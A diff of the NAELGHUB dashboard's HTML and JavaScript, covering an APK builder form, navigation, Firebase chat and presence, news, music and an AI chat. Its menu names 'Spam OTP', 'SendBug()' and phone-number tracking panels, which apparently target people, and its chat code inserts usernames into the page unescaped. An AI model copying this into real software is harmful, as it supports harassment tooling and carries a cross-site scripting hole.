+        <div class="noxxa-field"><button type="button" class="noxxa-btn" onclick="noxxaCheckUrlSafety()">🛡️ CEK KEAMANAN URL</button><div id="noxxaSafetyResult" class="noxxa-help" style="margin-top:8px">Pemeriksaan lokal untuk tanda-tanda URL mencurigakan. Ini bukan jaminan bahwa situs aman.</div></div>
+        <div id="noxxaHtmlBox" class="noxxa-field noxxa-hidden"><span class="noxxa-label">FOLDER HTML</span><input id="noxxaFolder" type="file" webkitdirectory directory multiple><div class="noxxa-help">Pilih folder project yang memiliki <b>index.html</b>.</div></div>
+        <div class="noxxa-actions"><button class="noxxa-btn" onclick="navigate('dashboard')">← KEMBALI</button><button class="noxxa-btn primary" onclick="noxxaGoStep(2)">SELANJUTNYA →</button></div>
+      </div>
+
+      <div id="noxxaStep2" class="noxxa-section noxxa-hidden">
+        <span class="noxxa-label">TAMBAH CLIENT APK</span>
+        <div class="noxxa-grid2">
+          <div class="noxxa-iconbox"><div class="noxxa-iconpreview" id="noxxaIconPreview">＋</div><div style="flex:1"><div style="font-weight:800">APP ICON</div><div class="noxxa-help">Pilih .png / .jpg / .webp</div><input id="noxxaIcon" type="file" accept="image/png,image/jpeg,image/webp" onchange="previewNoxxaIcon(this)"></div></div>
+          <div class="noxxa-field" style="margin-top:0"><span class="noxxa-label">VERSI APK</span><input id="noxxaVersion" value="1.0.0" maxlength="20"></div>
+        </div>
+        <div class="noxxa-grid2 equal">
+          <div class="noxxa-field"><span class="noxxa-label">NAMA APK</span><input id="noxxaName" value="NOXXA" maxlength="40"></div>
+          <div class="noxxa-field"><span class="noxxa-label">KEY / PACKAGE</span><input id="noxxaKey" value="com.naelghub.noxxa" maxlength="80"></div>
+        </div>
+        <div class="noxxa-field"><span class="noxxa-label">SUMBER</span><input id="noxxaSourceInfo" value="URL Web" readonly></div>
+        <div class="noxxa-actions"><button class="noxxa-btn" onclick="noxxaGoStep(1)">← KEMBALI</button><button class="noxxa-btn primary" onclick="generateNoxxaProject()">🚀 BUILD APK PROJECT</button></div>
+        <div id="noxxaStatus" class="noxxa-status">Siap. Build cloud akan dilakukan melalui GitHub Actions.</div><div id="noxxaBuildProgress" class="noxxa-progress-wrap" style="display:none"><div class="noxxa-progress-top"><span id="noxxaProgressLabel">Menyiapkan...</span><b id="noxxaProgressPct">0%</b></div><div class="noxxa-progress"><i id="noxxaProgressBar"></i></div><div id="noxxaBuildStage" class="noxxa-help">Menunggu...</div></div><div class="noxxa-cloud-note">☁️ Cloud Builder aktif · Android SDK + Gradle · tidak memakai localhost</div><input id="noxxaBuilderUrl" type="hidden" value=""><pre id="noxxaBuildLog" style="white-space:pre-wrap;max-height:180px;overflow:auto;margin-top:10px;padding:10px;border-radius:12px;background:rgba(0,0,0,.25);font-size:10px"></pre><a id="noxxaDownload" class="noxxa-btn primary" style="display:none;text-decoration:none;margin-top:10px;justify-content:center" target="_blank">⬇️ DOWNLOAD APK</a>
+        <div class="noxxa-apk-shelf" style="margin-top:14px;padding:14px;border:1px solid rgba(255,255,255,.1);border-radius:16px;background:rgba(0,0,0,.22)">
+          <div style="display:flex;align-items:center;justify-content:space-between;gap:10px"><div><div style="font-weight:900;letter-spacing:1px">📦 NOXXA APK</div><div class="noxxa-help">APK cloud yang selesai dibuat akan muncul sebagai tombol download.</div></div><button type="button" class="noxxa-btn" style="width:auto;min-width:110px" onclick="refreshNoxxaApks()">↻ REFRESH</button></div>
+          <div id="noxxaApkList" style="margin-top:10px"><div class="noxxa-help">Belum ada APK.</div></div>
+        </div>
+        <div class="noxxa-note">NOXXA membuat project Android WebView. APK final dikompilasi oleh Android SDK/Gradle pada builder. Setelah selesai, file disimpan di bagian <b>NOXXA APK</b> agar dapat di-download/dibagikan.</div>
+      </div>
+    </div>
+  </section>
+
+  <nav class="dash-bottom-nav">
+    <div class="dash-nav-item active" data-nav="dashboard" onclick="navigate('dashboard')"><i class="fas fa-home"></i><span>Beranda</span></div>
+    <div class="dash-nav-item" data-nav="aic" onclick="navigate('aic')"><i class="fas fa-robot"></i><span>AI</span></div>
+    <div class="dash-nav-item" data-nav="noxxa" onclick="navigate('noxxa')"><i class="fas fa-mobile-screen-button"></i><span>NOXXA BUILD APK</span></div>
+    <div class="dash-nav-item" data-nav="apis" onclick="navigate('apis')"><i class="fas fa-plug"></i><span>API</span></div>
+    <div class="dash-nav-item" data-nav="settings" onclick="navigate('settings')"><i class="fas fa-palette"></i><span>Tema</span></div>
+  </nav>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+<script src="api-config.js"></script>
+<script src="app.js"></script>
+<script>
+/* ============================================================
+   NAELGHUB v14.1 — Dashboard Logic (FIXED MENU)
+   ============================================================ */
+let fbApp = null, fbDB = null, fbStorage = null, chatListener = null, nxSenderTimer = null, nxExpiryTimer = null, nxNewsTimer = null;
+
+/* CHECK SESSION */
+(function(){
+  const s = getSession();
+  if(!s || !s.expiry || s.expiry <= Date.now()){
+    console.log('❌ No session, redirect...');
+    window.location.href = 'login.html';
+    return;
+  }
+  window.currentUser = { username: s.username, role: s.role, expiry: s.userExpiry || '2026-12-31' };
+
+  if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', initDashboard);
+  } else {
+    initDashboard();
+  }
+})();
+
+function initDashboard(){
+  console.log('✅ Init dashboard for:', window.currentUser);
+
+  const u = window.currentUser;
+  const rcfg = ROLES[u.role] || ROLES.member;
+
+  document.getElementById('sidebarUsername').textContent = u.username;
+  document.getElementById('headerUsername').textContent = u.username;
+  document.getElementById('sidebarAvatar').textContent = u.username[0].toUpperCase();
+  document.getElementById('headerAvatar').textContent = u.username[0].toUpperCase();
+  document.getElementById('greetAvatar').textContent = u.username[0].toUpperCase();
+  document.getElementById('greetName').textContent = u.username.toUpperCase();
+  document.getElementById('sidebarExp').textContent = u.expiry;
+
+  const sb = document.getElementById('sidebarRoleBadge');
+  sb.className = 'role-badge ' + u.role;
+  sb.textContent = rcfg.label;
+  const hb = document.getElementById('headerRoleBadge');
+  hb.className = 'role-badge ' + u.role;
+  hb.textContent = rcfg.label;
+
+  /* ============ FIX: BIND SIDEBAR MENU CLICKS ============ */
+  document.querySelectorAll('#sidebarNav a[data-page]').forEach(link => {
+    link.addEventListener('click', function(e){
+      e.preventDefault();
+      const page = this.getAttribute('data-page');
+      console.log('👆 Menu clicked:', page);
+      navigate(page);
+    });
+  });
+
+  /* ============ FIX: BIND BOTTOM NAV CLICKS ============ */
+  document.querySelectorAll('.dash-nav-item[data-nav]').forEach(item => {
+    item.addEventListener('click', function(e){
+      e.preventDefault();
+      const page = this.getAttribute('data-nav');
+      console.log('👆 Bottom nav clicked:', page);
+      navigate(page);
+    });
+  });
+
+  /* ============ INIT SEMUA FITUR ============ */
+  updateUIByRole();
+  updateStatusBar();
+  updateBattery();
+  initFirebase();
+  initMemberSecurity();
+  initNoxxaLiveHub();
+  renderSrvCategoryTabs();
+  setSrvTargetType('personal');
+  renderSrvBugGrid();
+  loadBackendUrlToUI();
+  loadHistory();
+  initAudio();
+  loadMusicAPI();
+  loadSettings();
+  renderTools();
+  refreshMemberList();
+  applyMemberPanelAccess();
+  initPaymentProof();
+  loadGroqKeyToUI();
+  loadWeather();
+  loadIPInfo();
+  initLiveTelemetry();
+  loadUiPreferences();
+  refreshPairQr();
+  runBackendHealthCheck();
+
+  setInterval(updateStatusBar, 1000);
+  setInterval(updateBattery, 30000);
+  nxExpiryTimer = setInterval(updateNoxxaExpiry, 1000);
+  nxSenderTimer = setInterval(updateNoxxaSenderStatus, 5000);
+  nxNewsTimer = setInterval(()=>loadNoxxaNews(true), 120000);
+  setInterval(loadWeather, 300000);
+  console.log('🔥 Dashboard ready. All menus bound.');
+}
+
+/* ============ NAVIGATE FUNCTION ============ */
+function navigate(page){
+  console.log('🧭 Navigate to:', page);
+  document.body.classList.toggle('noxxa-open', page === 'noxxa');
+
+  // Hide semua panel
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+
+  // Show panel target
+  const panel = document.getElementById('panel-' + page);
+  if(!panel){
+    console.warn('❌ Panel not found:', 'panel-' + page);
+    return;
+  }
+  panel.classList.add('active');
+
+  // Update sidebar active
+  document.querySelectorAll('.sidebar-nav a').forEach(a => a.classList.remove('active'));
+  const nav = document.querySelector(`.sidebar-nav a[data-page="${page}"]`);
+  if(nav) nav.classList.add('active');
+
+  // Update bottom nav active
+  document.querySelectorAll('.dash-nav-item').forEach(d => d.classList.remove('active'));
+  const dn = document.querySelector(`.dash-nav-item[data-nav="${page}"]`);
+  if(dn) dn.classList.add('active');
+
+  // Update title
+  const titles = { noxxa:'NOXXA BUILD APK',
+    dashboard:'Dashboard', member:'Member Panel', sendbug:'SendBug()', privatechat:'Sender Private', pairing:'WhatsApp Pairing',
+    tools:'Tools', chat:'Chat Live', music:'Music', tracker:'Lacak Nomor',
+    spamotp:'Spam OTP', aic:'AI Chat Groq', apis:'Multi API',
+    history:'History', settings:'Settings', about:'About'
+  };
+  const pt = document.getElementById('pageTitle');
+  if(pt) pt.textContent = titles[page] || page;
+
+  // Close sidebar on mobile
+  if(window.innerWidth <= 992){
+    document.getElementById('sidebar').classList.remove('open');
+    document.getElementById('sidebarOverlay').classList.remove('active');
+  }
+
+  // Scroll to top
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+
+  // Call page-specific init
+  if(page === 'member') { refreshMemberList(); applyMemberPanelAccess(); initPaymentProof(); }
+  if(page === 'history') { renderHistory(); }
+  if(page === 'aic') { loadGroqKeyToUI(); }
+  if(page === 'privatechat') { updatePrivatePanelStatus(); }
+  if(page === 'pairing') { checkPairingStatus2(); }
+}
+
+function toggleSidebar(){
+  document.getElementById('sidebar').classList.toggle('open');
+  document.getElementById('sidebarOverlay').classList.toggle('active');
+}
+function handleLogout(){
+  if(confirm('Logout?')){
+    if(fbDB && window.currentUser) fbDB.ref('presence/'+window.currentUser.username).update({online:false,timestamp:Date.now()});
+    clearSession();
+    window.location.href = 'login.html';
+  }
+}
+
+/* ============ UI ROLE ============ */
+function updateUIByRole(){
+  document.querySelectorAll('.sidebar-nav a[data-min-role]').forEach(a=>{
+    const min = ROLES[a.dataset.minRole]?.level || 1;
+    if(getMyLevel() < min) a.classList.add('hidden-role');
+    else a.classList.remove('hidden-role');
+  });
+  const badge = document.getElementById('adminBadge');
+  if(badge){
+    if(isDeveloper()) badge.innerHTML = '<span style="color:var(--dev-color);font-weight:700;">[DEV]</span>';
+    else if(hasOwner()) badge.innerHTML = '<span style="color:var(--owner-color);font-weight:700;">[OWNER]</span>';
+    else if(hasReseller()) badge.innerHTML = '<span style="color:var(--reseller-color);font-weight:700;">[RESELLER]</span>';
+    else if(hasVIP()) badge.innerHTML = '<span style="color:var(--vip-color);font-weight:700;">[VIP]</span>';
+    else badge.innerHTML = '<span style="color:var(--free-color);font-weight:700;">[MEMBER]</span>';
+  }
+  const qm = document.getElementById('dashQuickMember');
+  if(qm) qm.style.display = canCreateAccess() ? 'block' : 'none';
+}
+
+function updateStatusBar(){
+  const n = new Date();
+  const c = document.getElementById('clockDisplay');
+  if(c) c.textContent = `${String(n.getHours()).padStart(2,'0')}:${String(n.getMinutes()).padStart(2,'0')}`;
+  const s = document.getElementById('signalLevel');
+  if(s){ const arr=['4G','5G','LTE']; s.textContent = arr[Math.floor(Math.random()*arr.length)]; }
+}
+async function updateBattery(){
+  try{
+    const el = document.getElementById('batteryLevel');
+    if('getBattery' in navigator){ const b = await navigator.getBattery(); if(el) el.textContent = Math.round(b.level*100)+'%'; }
+    else if(el) el.textContent = '70%';
+  }catch{ const el=document.getElementById('batteryLevel'); if(el) el.textContent='70%'; }
+}
+
+/* ============ FIREBASE ============ */
+function initFirebase(){
+  try{
+    if(typeof firebase === 'undefined') return;
+    if(fbApp){ try{ fbApp.delete(); }catch{} }
+    fbApp = firebase.initializeApp(firebaseConfig);
+    fbDB = firebase.database(fbApp);
+    try { fbStorage = firebase.storage(fbApp); } catch(e) { fbStorage = null; console.warn('Firebase Storage belum tersedia', e); }
+    const st = document.getElementById('fbStatus');
+    if(st){ st.textContent='● Firebase'; st.className='firebase-status connected'; }
+    const st2 = document.getElementById('fbChatStatus'); if(st2) st2.textContent = '✅ Connected';
+    updatePresence();
+    listenChatFirebase();
+  }catch(e){ console.error(e); }
+}
+function updatePresence(){
+  if(!fbDB || !window.currentUser) return;
+  const r = fbDB.ref('presence/'+window.currentUser.username);
+  r.set({username:window.currentUser.username, role:window.currentUser.role, timestamp:Date.now(), online:true});
+  r.onDisconnect().update({online:false, timestamp:Date.now()});
+  fbDB.ref('presence').on('value', snap=>{
+    const d = snap.val() || {};
+    const onlineEntries = Object.values(d).filter(u=>u.online && (Date.now()-(u.timestamp||0)<300000));
+    const on = onlineEntries.length;
+    const tot = Object.keys(d).length;
+    const e1 = document.getElementById('dashOnlineNow'); if(e1) e1.textContent = on;
+    const e2 = document.getElementById('dashTotalMember'); if(e2) e2.textContent = tot;
+    const nx1 = document.getElementById('nxOnlineUsers'); if(nx1) nx1.textContent = on;
+    const nx2 = document.getElementById('nxOnlineNames'); if(nx2) nx2.textContent = onlineEntries.slice(0,5).map(u=>u.username||'?').join(', ') || 'Tidak ada user online';
+  });
+}
+function listenChatFirebase(){
+  if(!fbDB) return;
+  if(chatListener) fbDB.ref('chat/messages').off('value', chatListener);
+  chatListener = fbDB.ref('chat/messages').orderByChild('timestamp').limitToLast(100).on('value', snap=>{
+    const data = snap.val();
+    const c = document.getElementById('chatMessages');
+    if(!c) return;
+    if(!data){ c.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:12px;">Belum ada pesan.</div>'; return; }
+    const msgs = Object.values(data).sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));
+    const isSelf = m => window.currentUser && m.username === window.currentUser.username;
+    c.innerHTML = msgs.map(m=>{
+      const rcfg = ROLES[m.role] || ROLES.member;
+      const color = m.color || '#ff1744';
+      return `<div class="chat-message ${isSelf(m)?'self':''}"><div class="avatar" style="background:linear-gradient(135deg,${color},${rcfg.color});">${(m.username||'?')[0].toUpperCase()}</div><div class="body"><div class="msg-head"><span class="msg-user" style="color:${rcfg.color};">${m.username}</span><span class="role-badge ${m.role}" style="font-size:7px;">${rcfg.emoji} ${rcfg.label}</span><span class="msg-time">${m.time||'--:--'}</span></div><div class="msg-text">${escapeHtml(m.message||'')}</div></div></div>`;
+    }).join('');
+    c.scrollTop = c.scrollHeight;
+  });
+}
+function sendChatMessage(){
+  const input = document.getElementById('chatInput'); if(!input) return;
+  const msg = input.value.trim(); if(!msg) return;
+  if(!fbDB){ showToast('⚠️ Firebase belum connect'); return; }
+  const colors = ['#ff1744','#8b00ff','#00d4ff','#ffd700','#00e676','#ff9100','#4285f4','#ea4335'];
+  const color = colors[window.currentUser.username.charCodeAt(0)%colors.length];
+  fbDB.ref('chat/messages').push({
+    username: window.currentUser.username,
+    role: window.currentUser.role || 'member',
+    message: msg,
+    time: new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'}),
+    color, timestamp: Date.now()
+  }).then(()=>{ input.value = ''; }).catch(e=>showToast('❌ '+e.message));
+}
+
+
+/* ============================================================
+   NOXXA LIVE HUB — realtime dashboard, expiry, sender, news, social
+   ============================================================ */
+function initNoxxaLiveHub(){
+  const u=window.currentUser||{};
+  const a=document.getElementById('nxDashAvatar'); if(a) a.textContent=(u.username||'U')[0].toUpperCase();
+  const n=document.getElementById('nxDashName'); if(n) n.textContent=(u.username||'USER').toUpperCase();
+  const r=document.getElementById('nxDashRole'); if(r) r.textContent=(ROLES[u.role]?.label||'MEMBER');
+  updateNoxxaExpiry();
+  updateNoxxaSenderStatus();
+  loadNoxxaNews();
+  if(window.noxxaNewsTimer) clearInterval(window.noxxaNewsTimer);
+  window.noxxaNewsTimer=setInterval(()=>loadNoxxaNews(true),60000);
+  initNoxxaSocialFeed();
+  initNoxxaDashboardAudio();
+}
+
+function updateNoxxaExpiry(){
+  const u=window.currentUser||{};
+  let expiry=u.expiry||u.userExpiry||'--';
+  try{ const users=getUsers(); const local=users[u.username]; if(local?.expiry) expiry=local.expiry; }catch{}
+  const value=document.getElementById('nxDashExpiry'), daysEl=document.getElementById('nxExpiryDays'), detail=document.getElementById('nxExpiryDetail'), cd=document.getElementById('nxDashExpiryCountdown');
+  if(value) value.textContent=expiry;
+  if(expiry==='PERMANENT'){ if(daysEl) daysEl.textContent='∞'; if(detail) detail.textContent='PERMANENT · Member Panel'; if(cd) cd.textContent='Tidak kedaluwarsa'; return; }
+  const d=new Date(expiry+'T23:59:59');
+  if(Number.isNaN(d.getTime())){if(daysEl)daysEl.textContent='--';if(detail)detail.textContent='Tanggal belum tersedia';if(cd)cd.textContent='--';return;}
+  const ms=d.getTime()-Date.now();
+  const days=Math.max(0,Math.ceil(ms/86400000));
+  if(daysEl) daysEl.textContent=days;
+  if(detail) detail.textContent=days<=0?'EXPIRED · Member Panel':'Hari tersisa · Member Panel';
+  if(cd) cd.textContent=days<=0?'EXPIRED':`${days} hari lagi`;
+  if(days<=0 && window.currentUser) window.currentUser.expired=true;
+}
+
+async function updateNoxxaSenderStatus(){
+  const base=typeof getBackendUrl==='function'?getBackendUrl():'';
+  const count=document.getElementById('nxSenderCount'), info=document.getElementById('nxSenderInfo');
+  if(!base){if(count)count.textContent='0';if(info)info.textContent='Backend belum diatur';return;}
+  try{
+    const r=await fetch(base.replace(/\/$/,'')+'/api/status',{cache:'no-store',signal:AbortSignal.timeout(5000)});
+    const d=await r.json();
+    if(d.connected){
+      if(count)count.textContent='1';
+      if(info)info.textContent='🟢 Tertaut · '+(d.number||'Nomor tersambung');
+    }else{
+      if(count)count.textContent='0';
+      if(info)info.textContent='🟡 Menunggu pairing';
+    }
+  }catch(e){
+    if(count)count.textContent='0';
+    if(info)info.textContent='🔴 Backend offline';
+  }
+}
+
+let noxxaNewsCategory='semua';
+async function loadNoxxaNews(silent=false){
+  const list=document.getElementById('nxNewsList'), stamp=document.getElementById('nxNewsUpdated');
+  if(!list)return;
+  const q=(document.getElementById('nxNewsSearch')?.value||'').trim();
+  if(!silent) list.innerHTML='<div class="nx-empty">⏳ Memuat semua berita terbaru...</div>';
+  try{
+    const endpoint='/.netlify/functions/news-feed?q='+encodeURIComponent(q)+'&category='+encodeURIComponent(noxxaNewsCategory)+'&limit=100';
+    const r=await fetch(endpoint,{cache:'no-store',signal:AbortSignal.timeout(15000)});
+    if(!r.ok) throw new Error('News HTTP '+r.status);
+    const d=await r.json(); const items=Array.isArray(d.items)?d.items:[];
+    if(!items.length){list.innerHTML='<div class="nx-empty">Belum ada berita untuk kategori ini.</div>';return;}
+    list.innerHTML=items.map(x=>`<a class="nx-news-item" href="${escapeAttr(x.link||'#')}" target="_blank" rel="noopener noreferrer"><div class="nx-news-title">${escapeHtml(x.title||'Tanpa judul')}</div><div class="nx-news-meta">${escapeHtml(x.source||'Sumber')} · ${escapeHtml(x.pubDate||'')}</div></a>`).join('');
+    if(stamp)stamp.textContent=`${items.length} berita · Update ${new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'})}`;
+  }catch(e){ if(!silent)list.innerHTML='<div class="nx-empty">⚠️ Berita belum bisa dimuat. Coba refresh.</div>'; }
+}
+function setNoxxaNewsCategory(cat){
+  noxxaNewsCategory=cat||'semua';
+  document.querySelectorAll('.nx-news-cat').forEach(b=>b.classList.toggle('active',b.dataset.cat===noxxaNewsCategory));
+  loadNoxxaNews();
+}
+
+function escapeAttr(v){return String(v).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));}
+
+function initNoxxaSocialFeed(){
+  if(!fbDB){ const el=document.getElementById('nxSocialFeed'); if(el)el.innerHTML='<div class="nx-empty">Firebase belum terhubung.</div>'; return; }
+  fbDB.ref('noxxagram/posts').orderByChild('timestamp').limitToLast(50).on('value',snap=>{
+    const data=snap.val()||{};
+    const posts=Object.entries(data).map(([id,p])=>({id,...p})).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
+    const el=document.getElementById('nxSocialFeed'); if(!el)return;
+    if(!posts.length){el.innerHTML='<div class="nx-empty">Belum ada postingan. Jadilah yang pertama. 📸</div>';return;}
+    el.innerHTML=posts.map(p=>`<article class="nx-post"><div class="nx-post-head"><span class="nx-post-user">@${escapeHtml(p.username||'user')}</span><span class="nx-post-time">${new Date(p.timestamp||Date.now()).toLocaleString('id-ID')}</span></div>${p.caption?`<div class="nx-post-caption">${escapeHtml(p.caption)}</div>`:''}${p.imageUrl?`<img src="${escapeAttr(p.imageUrl)}" alt="Foto NOXXAGRAM" loading="lazy" style="width:100%;max-height:420px;object-fit:cover;display:block">`:''}${p.videoUrl?`<video src="${escapeAttr(p.videoUrl)}" controls playsinline preload="metadata"></video>`:''}${p.audioUrl?`<audio src="${escapeAttr(p.audioUrl)}" controls preload="metadata"></audio>`:''}<div class="nx-post-actions">${p.imageUrl?'🖼️ Foto':''}${p.videoUrl?' · 🎥 Video':''}${p.audioUrl?' · 🎵 Audio':''}</div></article>`).join('');
+  });
+}
+
+async function uploadNoxxaPost(){
+  const status=document.getElementById('nxUploadStatus'), video=document.getElementById('nxPostVideo')?.files?.[0], image=document.getElementById('nxPostImage')?.files?.[0], audioFile=document.getElementById('nxPostAudio')?.files?.[0], caption=(document.getElementById('nxPostCaption')?.value||'').trim();
+  if(!fbDB||!fbStorage){if(status)status.textContent='❌ Firebase Storage belum tersedia/aturan Storage belum mengizinkan upload.';return;}
+  if(!video&&!image&&!audioFile){if(status)status.textContent='⚠️ Pilih foto, video, atau audio.';return;}
+  if(video && image){if(status)status.textContent='⚠️ Pilih video atau foto untuk satu postingan.';return;}
+  const user=(window.currentUser?.username||'user').replace(/[^a-zA-Z0-9_-]/g,'_');
+  const id=Date.now()+'_'+Math.random().toString(36).slice(2,8);
+  const safeName=f=>String(f.name).replace(/[^a-zA-Z0-9._-]/g,'_');
+  const uploadOne=async(f,kind)=>{if(!f)return null;const ref=fbStorage.ref(`noxxagram/${user}/${id}_${kind}_${safeName(f)}`);const task=ref.put(f,{contentType:f.type||undefined});await new Promise((resolve,reject)=>task.on('state_changed',snap=>{const pct=snap.totalBytes?Math.round(snap.bytesTransferred/snap.totalBytes*100):0;if(status)status.textContent=`⏫ Upload ${kind}: ${pct}%`;},reject,resolve));return ref.getDownloadURL();};
+  try{
+    if(status)status.textContent='⏳ Menyiapkan upload...';
+    const [videoUrl,imageUrl,audioUrl]=await Promise.all([uploadOne(video,'video'),uploadOne(image,'image'),uploadOne(audioFile,'audio')]);
+    await fbDB.ref('noxxagram/posts').push({username:window.currentUser?.username||'user',caption,videoUrl:videoUrl||null,imageUrl:imageUrl||null,audioUrl:audioUrl||null,timestamp:Date.now()});
+    if(status)status.textContent='✅ Posting berhasil dan feed diperbarui realtime.';
+    const c=document.getElementById('nxPostCaption'),v=document.getElementById('nxPostVideo'),im=document.getElementById('nxPostImage'),a=document.getElementById('nxPostAudio');if(c)c.value='';if(v)v.value='';if(im)im.value='';if(a)a.value='';
+  }catch(e){if(status)status.textContent='❌ Upload gagal: '+e.message;}
+}
+
+function initNoxxaDashboardAudio(){
+  const da=document.getElementById('nxDashAudio');
+  if(!da)return;
+  da.addEventListener('play',()=>{const t=document.getElementById('nxMusicTitle');if(t&&audio?.src)t.textContent=document.getElementById('nowPlayingTitle')?.textContent||'Sedang diputar';});
+}
+
+async function searchNoxxaDashboardMusic(){
+  const q=(document.getElementById('nxMusicSearch')?.value||'').trim();
+  const box=document.getElementById('nxMusicResults');if(!box||!q)return;
+  box.innerHTML='<div class="nx-empty">⏳ Mencari musik global...</div>';
+  try{
+    const r=await fetch('https://api.jamendo.com/v3.0/tracks/?client_id='+encodeURIComponent(JAMENDO_CLIENT_ID)+'&format=json&limit=50&namesearch='+encodeURIComponent(q)+'&audioformat=mp32');
+    if(!r.ok) throw new Error('Jamendo HTTP '+r.status);
+    const d=await r.json();const tracks=(d.results||[]).filter(x=>x.audio);
+    if(!tracks.length){box.innerHTML='<div class="nx-empty">Tidak ditemukan lagu full-track pada katalog ini.</div>';return;}
+    box.innerHTML=tracks.map((t,i)=>`<div class="nx-song" onclick="playNoxxaDashTrack(${i})"><i class="fas fa-play-circle"></i><div style="min-width:0;flex:1"><div style="font-size:10px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${escapeHtml(t.name||'Unknown')}</div><div style="font-size:8px;color:rgba(255,255,255,.45)">${escapeHtml(t.artist_name||'Unknown')} · ${formatDuration(Number(t.duration||0))}</div></div></div>`).join('');
+    window.nxDashTracks=tracks;
+  }catch(e){box.innerHTML='<div class="nx-empty">⚠️ Musik global gagal dimuat. Musik bawaan tetap tersedia.</div>';}
+}
+
+
+async function loadNoxxaLyrics(title,artist){
+  const box=document.getElementById('nxLyricsBox'),txt=document.getElementById('nxLyricsText'); if(!box||!txt)return;
+  if(!title)return; box.style.display='block'; txt.textContent='Mencari lirik...';
+  try{
+    const q=`https://lrclib.net/api/get?track_name=${encodeURIComponent(title)}&artist_name=${encodeURIComponent(artist||'')}`;
+    const r=await fetch(q,{headers:{'Accept':'application/json'}}); if(!r.ok)throw Error('Lirik tidak tersedia');
+    const d=await r.json(); const lyrics=d.syncedLyrics||d.plainLyrics; if(!lyrics)throw Error('Lirik tidak tersedia untuk lagu ini.'); txt.textContent=lyrics;
+  }catch(e){txt.textContent='Lirik tidak tersedia untuk lagu ini.';}
+}
+function playNoxxaDashTrack(i){
+  const t=window.nxDashTracks?.[i], da=document.getElementById('nxDashAudio');if(!t||!da)return;
+  da.src=t.audio;da.play().catch(()=>{});
+  const a=document.getElementById('nxMusicTitle'),b=document.getElementById('nxMusicArtist');if(a)a.textContent=t.name||'Unknown';if(b)b.textContent=t.artist_name||'Unknown'; loadNoxxaLyrics(t.name||'',t.artist_name||'');
+}
+
+/* ============ GROQ AI — NETLIFY SECURE ============ */
+const NAEL_AI_ENDPOINT = '/.netlify/functions/groq-chat';
+const NAEL_AI_STORAGE = 'naelghub_ai_history_v2';
+let naelAiHistory = [];
+
+function loadAiHistory(){
+  try{
+    const raw = localStorage.getItem(NAEL_AI_STORAGE);
+    naelAiHistory = raw ? JSON.parse(raw) : [];
+    if(!Array.isArray(naelAiHistory)) naelAiHistory=[];
+  }catch{ naelAiHistory=[]; }
+  const c=document.getElementById('aiMessages');
+  if(c && naelAiHistory.length){
+    c.innerHTML='';
+    naelAiHistory.forEach(m=>addAiMessage(m.role==='user'?'user':'bot',m.content,false));
+  }
+}
+function saveAiHistory(){
+  try{ localStorage.setItem(NAEL_AI_STORAGE, JSON.stringify(naelAiHistory.slice(-30))); }catch{}
+}
+function resetAiChat(){
+  naelAiHistory=[]; saveAiHistory();
+  const c=document.getElementById('aiMessages');
+  if(c) c.innerHTML='<div class="ai-msg bot"><div class="ai-avatar"><i class="fas fa-robot"></i></div><div class="ai-body"><div class="ai-name">NAEL-AI</div><div class="ai-text">Chat direset. Ada yang mau kamu tanyakan? 🤖</div></div></div>';
+  showToast('✅ Chat AI direset');
+}
+function setAiState(text, ok=true){
+  const a=document.getElementById('groqState'); if(a) a.textContent=text;
+  const b=document.getElementById('groqSecureState'); if(b){ b.textContent=(ok?'● ':'⚠️ ')+text; b.style.color=ok?'#00e676':'#ffd166'; }
+}
+async function sendAiMessage(){
+  const input=document.getElementById('aiInput'); if(!input) return;
+  const msg=input.value.trim(); if(!msg) return;
+  const btn=input.parentElement?.querySelector('button');
+  if(btn) btn.disabled=true;
+  addAiMessage('user',msg,true);
+  input.value='';
+  naelAiHistory.push({role:'user',content:msg}); saveAiHistory();
+  const container=document.getElementById('aiMessages');
+  const botDiv=document.createElement('div'); botDiv.className='ai-msg bot';
+  botDiv.innerHTML='<div class="ai-avatar"><i class="fas fa-robot"></i></div><div class="ai-body"><div class="ai-name">NAEL-AI</div><div class="ai-text"><i class="fas fa-spinner fa-spin"></i> Thinking...</div></div>';
+  container.appendChild(botDiv); container.scrollTop=container.scrollHeight;
+  setAiState('Menghubungkan...',true);
+  try{
+    const messages=[
+      {role:'system',content:'Kamu adalah NAEL-AI, asisten resmi NAELGHUB. Jawab dalam bahasa Indonesia yang santai, jelas, terarah, dan aman. Jangan mengarang fakta. Jika permintaan tidak jelas, tanyakan bagian yang perlu diperjelas. Untuk coding, berikan langkah yang bisa dilakukan di Android/Termux jika relevan.'},
+      ...naelAiHistory.slice(-18)
+    ];
+    const r=await fetch(NAEL_AI_ENDPOINT,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messages})});
+    let d={}; try{ d=await r.json(); }catch{}
+    if(!r.ok){ const detail=d.detail||d.error?.message||d.error||`Server AI error (${r.status})`; throw new Error(detail); }
+    const answer=d.choices?.[0]?.message?.content?.trim();
+    if(!answer) throw new Error('AI tidak mengirim jawaban.');
+    const bt=botDiv.querySelector('.ai-text'); if(bt) bt.textContent=answer;
+    naelAiHistory.push({role:'assistant',content:answer}); saveAiHistory();
+    setAiState('AI server siap',true);
+    addHistory('success',`AI: ${msg.substring(0,40)}`);
+  }catch(e){
+    const bt=botDiv.querySelector('.ai-text'); if(bt) bt.innerHTML='<span style="color:#ff1744;">❌ '+escapeHtml(e.message)+'</span>';
+    setAiState('Periksa Netlify Function / GROQ_API_KEY',false);
+  }finally{
+    if(btn) btn.disabled=false;
+    container.scrollTop=container.scrollHeight;
+  }
+}
